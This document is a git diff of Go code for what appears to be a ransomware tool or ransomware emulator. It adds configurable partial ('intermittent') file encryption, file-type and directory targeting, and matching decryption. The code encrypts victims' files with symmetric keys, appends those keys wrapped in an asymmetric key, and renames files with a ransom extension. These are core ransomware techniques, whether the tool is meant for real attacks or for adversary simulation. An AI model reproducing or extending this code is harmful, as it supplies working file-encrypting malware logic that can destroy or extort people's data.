@@ -19,9 +19,13 @@ import (
 	"io"
 	"os"
 	"path/filepath"
+	"regexp"
+	"slices"
 	"strings"
 	"sync"
 )
+
+var fileNameSkipRegex *regexp.Regexp
 
 // impacted
 var encryptionSignature = []byte{105, 109, 112, 97, 99, 116, 101, 100}
@@ -292,7 +296,7 @@ func generateKeys() (AsymKeyHandler, error) {
 
 }
 
-func encryptionWorker(c chan File, ewg *sync.WaitGroup, noteName string, method string, cipher string, extension string, asymKeys AsymKeyHandler, decrypt bool, group RansomActor) {
+func encryptionWorker(c chan File, ewg *sync.WaitGroup, noteName string, method string, cipher string, extension string, asymKeys AsymKeyHandler, decrypt bool, group RansomActor, config Config) {
 	// Receives files to encrypt
 	// If we are encrypting data, we need to use private key system to encrypt some 'extra' data appended
 	// Reverse if we are decrypting
@@ -311,40 +315,42 @@ func encryptionWorker(c chan File, ewg *sync.WaitGroup, noteName string, method 
 				decryptFile(file, cipher, asymKeys, group)
 				continue
 			} else {
-				encryptFile(file, method, extension, group.ExtensionMethod, asymKeys, cipher)
+				encryptFile(file, method, extension, group.ExtensionMethod, asymKeys, cipher, config.ThresholdFullEncrypt, config.EncryptionPercent)
 				continue
 			}
 		}
 	}
 }
 
-type SymHandler struct {
-	System          string
-	XChaCha20Cipher *chacha20.Cipher
-	EDS             ExtraDataStore
-	AESCipher       cipher.Stream
-}
-
-func (s *SymHandler) Initialize(key []byte, nonce []byte) error {
-	if s.System == "xchacha20" {
-		s.XChaCha20Cipher, s.EDS = getXChaCha20Cipher(key, nonce)
-	} else if s.System == "aes256" {
-		s.AESCipher, s.EDS = getAES256Cipher(key, nonce)
-	} else {
-		return fmt.Errorf("Symmetric System not implemented: %s", s.System)
+func shouldProcessFile(f string, config *Config) bool {
+	// Extension is in our exclusion list
+	if slices.Contains(config.FileExtensionExclusions, filepath.Ext(f)) {
+		return false
 	}
-	return nil
-}
-
-func (s *SymHandler) Encrypt(ct []byte, pt []byte) {
-	if s.System == "xchacha20" {
-		s.XChaCha20Cipher.XORKeyStream(ct, pt)
-	} else if s.System == "aes256" {
-		s.AESCipher.XORKeyStream(ct, pt)
+	extension := strings.ToLower(filepath.Ext(f))
+	nameWithoutExt := strings.TrimSuffix(filepath.Base(f), extension)
+	// Base file name matches exclusion list
+	if fileNameSkipRegex.MatchString(nameWithoutExt) {
+		return false
 	}
+
+	// Base Directory matches skip list
+	baseDirectory := filepath.Base(filepath.Dir(f))
+	if slices.Contains(config.DirectoryExclusions, baseDirectory) {
+		return false
+	}
+
+	// Extension Inclusions
+	if slices.Contains(config.FileExtensionInclusions, extension) {
+		return true
+	}
+
+	// Fail Closed
+	return false
+
 }
 
-func encryptFile(file File, method string, extension string, extensionMethod string, asymHandler AsymKeyHandler, cipher string) {
+func encryptFile(file File, method string, extension string, extensionMethod string, asymHandler AsymKeyHandler, cipher string, encryptThreshold int64, encryptPercentage int) {
 	printFormattedMessage(fmt.Sprintf("Encrypting: "+file.Path), INFO)
 
 	symHandler := SymHandler{
@@ -388,7 +394,7 @@ func encryptFile(file File, method string, extension string, extensionMethod str
 		}
 	}
 
-	if file.Size <= 1024 {
+	if file.Size <= encryptThreshold {
 		ptb := make([]byte, file.Size)
 		ct := make([]byte, file.Size)
 		_, err = inFile.Read(ptb)
@@ -396,13 +402,16 @@ func encryptFile(file File, method string, extension string, extensionMethod str
 			printFormattedMessage(fmt.Sprintf("Error encrypting file: %s", file.Path), ERROR)
 			return
 		}
-
 		symHandler.Encrypt(ct, ptb)
 		outFile.Write(ct)
+		symHandler.EDS.PercentEncrypted = 100
 
 	} else {
-		// How do we handle this for decryption?
-		// Need to make sure we always remove last 512 bytes of file from equation since that is our key then reverse the algorithm
+		symHandler.EDS.PercentEncrypted = int32(encryptPercentage)
+		// So - for percentage, we want to basically check each 256 chunk of the file for percent and get as close to possible
+		// Since we are doing 256 at a time, we want X% of 256 - our target bytes is X=(targetPercent/100)*256
+		targetBytes := (symHandler.EDS.PercentEncrypted * 256 / 100)
+
 		br := bufio.NewReaderSize(inFile, 256)
 		// Encrypt 64, Leave 192, etc until last 256 bytes of file - then encrypt remainder
 		for true {
@@ -421,12 +430,12 @@ func encryptFile(file File, method string, extension string, extensionMethod str
 				outFile.Write(ct)
 			} else {
 				// should have read 256 bytes - we will encrypt just the 64 then write this back to the file along with remainder of 256 plain-text
-				pt := make([]byte, 64)
-				ct := make([]byte, 64)
-				pt = ptb[:64]
+				pt := make([]byte, targetBytes)
+				ct := make([]byte, targetBytes)
+				pt = ptb[:targetBytes]
 				symHandler.Encrypt(ct, pt)
 				outFile.Write(ct)
-				outFile.Write(ptb[64:])
+				outFile.Write(ptb[targetBytes:])
 			}
 			if err != nil && errors.Is(err, io.EOF) {
 				break
@@ -444,8 +453,6 @@ func encryptFile(file File, method string, extension string, extensionMethod str
 		symHandler.EDS.OriginalExtensionLength = int32(len(originalExtension)) // TODO - Massive extensions would err
 	}
 
-	// Now we encrypt the KEY+NONCE and append to end of file
-	symHandler.EDS.PercentEncrypted = 25
 	cipherEmbeddedData, err := asymHandler.Encrypt(symHandler.EDS)
 	if err != nil {
 		printFormattedMessage(fmt.Sprintf("Error encrypting symmetric key data: %s", err.Error()), ERROR)
@@ -569,71 +576,57 @@ func decryptFile(file File, cipher string, asymKeys AsymKeyHandler, group Ransom
 	/*	sym_key := decryptEmbeddedData[0:32]
 		nonce := decryptEmbeddedData[32:]*/
 	//c, _ := getXChaCha20Cipher(eds.SymmetricKey, eds.SymmetricNonce)
-	fileOffSetRemoval := edsLength + 16      // The length of our eds Cipher Text plus the last 16 bytes representing the length storage and sig
-	if file.Size-fileOffSetRemoval <= 1024 { // compare 'original' file size without our added signature
-		inFile.Seek(0, 0)
-		// 512 represents the number of bytes padded onto the file containing our asymmetric-encrypted symmetric key and nonce
-		ct := make([]byte, file.Size-fileOffSetRemoval)
-		pt := make([]byte, file.Size-fileOffSetRemoval)
-		_, err = inFile.Read(ct)
+	fileOffSetRemoval := edsLength + 16 // The length of our eds Cipher Text plus the last 16 bytes representing the length storage and sig
+	// We need to decrypt up to file.Size-512 bytes since after that is our key
+	// One approach would be immediately truncating the file to prevent
+	// another is just looping through until we reach specified offset
+
+	ep := eds.PercentEncrypted
+	targetBytes := ep * 256 / 100
+	offset = int64(0)
+	offsetTarget := file.Size - fileOffSetRemoval // How do we prevent overflowing into this?
+	// Each iteration we calculate (file.Size-512) which is the EOF range with offsetTarget
+	// Once we reach a point where reading targetBytes will take us over, we trim our buffer to that and decrypt remainder and stop
+	// As we read, we increase offset by 256
+	lastBytesRead := int64(0)
+	for true {
+		final := false
+		bytesToRead := int64(256)
+		offset += lastBytesRead
+		if offset+int64(256) >= offsetTarget {
+			// If our next read will take us into key territory, adjust bytes read instead of 256 to the difference remaining and decrypt the remainder
+			bytesToRead = offsetTarget - offset
+			final = true
+		}
+		ctn := make([]byte, bytesToRead)
+		bytesRead, err := inFile.ReadAt(ctn, offset)
 		if err != nil {
-			printFormattedMessage(fmt.Sprintf("Error decrypting file: %s", file.Path), ERROR)
 			return
 		}
-		symHandler.Encrypt(pt, ct)
-		outFile.Write(pt)
-	} else {
-		// We need to decrypt up to file.Size-512 bytes since after that is our key
-		// One approach would be immediately truncating the file to prevent
-		// another is just looping through until we reach specified offset
 
-		offset := int64(0)
-		offsetTarget := file.Size - fileOffSetRemoval // How do we prevent overflowing into this?
-		// Each iteration we calculate (file.Size-512) which is the EOF range with offsetTarget
-		// Once we reach a point where reading targetBytes will take us over, we trim our buffer to that and decrypt remainder and stop
-		// As we read, we increase offset by 256
-		lastBytesRead := int64(0)
-		for true {
-			final := false
-			bytesToRead := int64(256)
-			offset += lastBytesRead
-			if offset+int64(256) >= offsetTarget {
-				// If our next read will take us into key territory, adjust bytes read instead of 256 to the difference remaining and decrypt the remainder
-				bytesToRead = offsetTarget - offset
-				final = true
-			}
-			ctn := make([]byte, bytesToRead)
-			bytesRead, err := inFile.ReadAt(ctn, offset)
-			if err != nil {
-				return
-			}
-
-			if bytesRead < 256 {
-				// Decrypt remainder since EOF
-				pt := make([]byte, bytesRead)
-				ct := make([]byte, bytesRead)
-				pt = ctn[:bytesRead] // Remove any non-read bytes from the buffer
-				symHandler.Encrypt(pt, ct)
-				outFile.Write(ct)
-			} else {
-				// should have read 256 bytes - we will decrypt just the 64 then write this back to the file along with remainder of 256 plain-text
-				pt := make([]byte, 64)
-				ct := make([]byte, 64)
-				ct = ctn[:64]
-				//fmt.Println(len(ct))
-				//fmt.Println(len(ctn[64:]))
-				symHandler.Encrypt(pt, ct)
-				outFile.Write(pt)
-				outFile.Write(ctn[64:])
-			}
-
-			lastBytesRead = int64(bytesRead)
-			if final {
-				// EOF
-				break
-			}
-
+		if bytesRead < 256 {
+			// Decrypt remainder since EOF
+			pt := make([]byte, bytesRead)
+			ct := make([]byte, bytesRead)
+			pt = ctn[:bytesRead] // Remove any non-read bytes from the buffer
+			symHandler.Encrypt(pt, ct)
+			outFile.Write(ct)
+		} else {
+			// should have read 256 bytes - we will decrypt just the 64 then write this back to the file along with remainder of 256 plain-text
+			pt := make([]byte, targetBytes)
+			ct := make([]byte, targetBytes)
+			ct = ctn[:targetBytes]
+			symHandler.Encrypt(pt, ct)
+			outFile.Write(pt)
+			outFile.Write(ctn[targetBytes:])
 		}
+
+		lastBytesRead = int64(bytesRead)
+		if final {
+			// EOF
+			break
+		}
+
 	}
 
 	// Remove our encrypted signature from the end
